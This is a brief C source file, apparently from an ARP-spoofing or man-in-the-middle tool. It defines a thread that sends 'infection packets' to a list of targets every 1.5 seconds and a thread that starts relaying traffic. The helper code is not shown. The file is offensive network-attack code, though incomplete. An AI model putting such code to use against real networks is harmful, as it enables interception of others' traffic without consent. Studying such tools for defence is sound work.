#include "thread_fuc.h"

DWORD WINAPI send_thread(void * param){
	input** str = (input**)param;
	u_char packet[INFECTION_PACKET_SIZE] = { 0 };
	int target_count = (*str)->data_check;
	int i = 0;
	while (1) {

		for (i = 0; i < target_count; i++){
			set_inf_pack(packet, *(*(str + i)));
			send(NULL, (u_char*)packet, INFECTION_PACKET_SIZE);
		}
		Sleep(1500);
	}
	return 0;
}

DWORD WINAPI relay_thread(void *param){
	input **str = (input**)param;

	relay_send(NULL, str, "start");

	return 0;
}